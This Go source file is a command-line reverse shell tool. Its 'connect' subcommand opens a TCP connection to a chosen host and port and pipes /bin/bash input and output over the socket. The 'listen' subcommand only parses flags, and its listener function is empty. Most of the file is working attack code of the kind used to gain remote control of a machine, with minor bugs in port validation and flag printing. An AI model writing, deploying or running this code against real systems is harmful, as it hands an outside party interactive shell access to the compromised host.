package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
)

func main() {
	connectCommand := flag.NewFlagSet("connect", flag.ExitOnError)
	listenCommand := flag.NewFlagSet("listen", flag.ExitOnError)

	connectHost := connectCommand.String("host", "", "Host to connnect")
	connectPort := connectCommand.Int("port", 4444, "Port to connect")
	connectCMD := connectCommand.String("cmd", "/bin/bash", "Command to execute")

	listenHost := listenCommand.String("host", "", "Host to listen")
	listenPort := listenCommand.Int("port", 4444, "Port to listen")

	if len(os.Args) < 2 {
		fmt.Println("\"connect\" or \"listen\" subcommand is required")
		os.Exit(1)
	}

	switch os.Args[1] {
	case "connect":
		connectCommand.Parse(os.Args[2:])
	case "listen":
		listenCommand.Parse(os.Args[2:])
	default:
		fmt.Println("\"connect\" or \"listen\" subcommand is required")
		os.Exit(1)
	}

	if connectCommand.Parsed() {
		// Required Flags
		if *connectHost == "" {
			connectCommand.PrintDefaults()
			os.Exit(1)
		}

		if *connectPort < 0 || *connectPort > 65536 {
			fmt.Println("[-] Err: Invalid port")
			connectCommand.PrintDefaults()
			os.Exit(1)
		}

		if *connectCMD == "" {
			connectCommand.PrintDefaults()
			os.Exit(1)
		}

		// Print
		fmt.Printf("Host: %s, Port: %d Command: %s \n", *connectHost, *connectPort, *connectCMD)
		revConnect(*connectHost, *connectPort, *connectCMD)
	}

	if listenCommand.Parsed() {
		// Required Flags
		if *listenHost == "" {
			connectCommand.PrintDefaults()
			os.Exit(1)
		}

		if *listenPort < 0 || *listenPort > 65536 {
			fmt.Println("[-] Err: Invalid port")
			connectCommand.PrintDefaults()
			os.Exit(1)
		}

		// Print
		fmt.Printf("Host: %s, Port: %d \n", *listenHost, *listenPort)
	}
}

func createShell(connection net.Conn, command string) {
	message := "successful connection from " + connection.LocalAddr().String()
	_, err := connection.Write([]byte(message + "\n"))
	if err != nil {
		log.Println("An error occurred trying to write to the outbound connection:", err)
		os.Exit(2)
	}

	cmd := exec.Command(command)
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()
}

func revConnect(host string, port int, cmd string) {
	// Create a new connection
	connection, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	if err != nil {
		log.Println("An error occurred trying to connect to the target:", err)
		os.Exit(1)
	}

	log.Println("Successfully connected to the target")

	createShell(connection, cmd)
}

func listener() {
}
